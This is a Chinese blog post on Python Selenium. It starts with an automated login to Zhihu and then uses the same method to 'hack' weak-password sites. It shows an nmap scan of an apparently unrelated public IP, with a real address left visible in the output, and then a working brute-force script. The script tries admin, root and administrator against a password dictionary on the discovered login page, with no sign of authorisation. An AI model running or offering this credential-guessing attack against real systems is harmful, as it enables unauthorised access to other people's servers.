---
layout: post
title: 使用selenium登陆网站
date: 2016-10-04 10:00:00 +0800
tags:
- selenium
- python
---

[Selenium][selenium]是一个用于Web应用程序自动化测试的工具。Selenium测试直接运行在浏览器中，就像真正的用户在操作一样，支持IE、Firefox、chrome等浏览器。本文使用了其自动登录网站的功能（Python库）。

{% highlight shell %}
$sudo pip install -U selenium
{% endhighlight %}

在浏览器查看知乎的登录界面的源码如下图:

![zhihu](/assets/201610/zhihu.png)

{% highlight python %}
#!/usr/bin/python
#coding:utf-8

import time
from selenium import webdriver

url = "http://www.zhihu.com/#signin"

browser = webdriver.Firefox()
browser.get(url)

# 根据name来定位网页控件
browser.find_element_by_name("account").clear()
# 模拟向输入框输入文本
browser.find_element_by_name("account").send_keys('your_account')
browser.find_element_by_name("password").clear()
browser.find_element_by_name("password").send_keys('your_password')

# 根据class来定位网页控件并模拟点击按钮
browser.find_element_by_class_name("submit").click()
{% endhighlight %}

这样，如果用户名和密码正确，就会登录知乎成功。

我们很自然地会想到，可以使用这种方法来hack使用弱密码的网站。假设现在有个公网IP，我们通过[nmap][nmap]查看其主机的OS及开放的端口号：

{% highlight shell %}
$sudo nmap -O xxx.xxx.xxx.xxx
Starting Nmap 6.47 ( http://nmap.org ) at 2016-10-04 11:05 CST
Nmap scan report for 218.205.169.209
Host is up (0.026s latency).
Not shown: 995 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
443/tcp  open  https
3389/tcp open  ms-wbt-server
8290/tcp open  unknown
8443/tcp open  https-alt
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized|WAP|phone
Running: iPXE 1.X, Linksys Linux 2.4.X, Linux 2.6.X, Sony Ericsson embedded
OS CPE: cpe:/o:ipxe:ipxe:1.0.0%2b cpe:/o:linksys:linux_kernel:2.4 cpe:/o:linux:linux_kernel:2.6 cpe:/h:sonyericsson:u8i_vivaz
OS details: iPXE 1.0.0+, Tomato 1.28 (Linux 2.4.20), Tomato firmware (Linux 2.6.22), Sony Ericsson U8i Vivaz mobile phone

OS detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.36 seconds
{% endhighlight %}

可以看出，该主机开放了80端口和443端口，尝试在浏览器输入http://xxx.xxx.xxx.xxx和https://xxx.xxx.xxx.xxx，展现在我们面前的是一个登陆系统，下面就可以使用Selenium来模拟手动密码输入，如过有验证码输入则需要进行使用图像识别库进行帮助。

由于登陆网页没有提示输入验证码，因此我们使用密码字典来进行试探用户名密码，代码如下

{% highlight python %}
#!/usr/bin/python
#coding:utf-8

import time
from selenium import webdriver

url = "http://xxx.xxx.xxx.xxx/login?TimeZone=-480"

# 假定几个常用的管理员用户名
user_list = ['admin', 'root', 'administrator']

# 导入密码字典
passwd_list = list()
fd = open('passwd.txt', 'r')
for line in fd:
	passwd_list.append(line.split()[0])
fd.close()

browser = webdriver.Firefox()
browser.get(url)

for username in user_list:
	for passwd in passwd_list:
		# 由于登陆之后脚本定位不到控件会报错，因此在这里打印username和passwd以便知道登陆系统使用的username和passwd
		print username, passwd
		# 根据id来定位网页控件
		browser.find_element_by_id("username").clear()
		browser.find_element_by_id("username").send_keys(username)
		browser.find_element_by_id("password").clear()
		browser.find_element_by_id("password").send_keys(passwd)
		browser.find_element_by_id("submit_btn").click()
{% endhighlight %}

Selenium的python用户手册：[http://selenium-python.readthedocs.io/index.html][selenium-python]

常用密码字典：[https://github.com/danielmiessler/SecLists/tree/master/Passwords][password]

[selenium]: https://github.com/SeleniumHQ/selenium
[nmap]: http://nmap.org
[password]: https://github.com/danielmiessler/SecLists/tree/master/Passwords
[selenium-python]: http://selenium-python.readthedocs.io/index.html
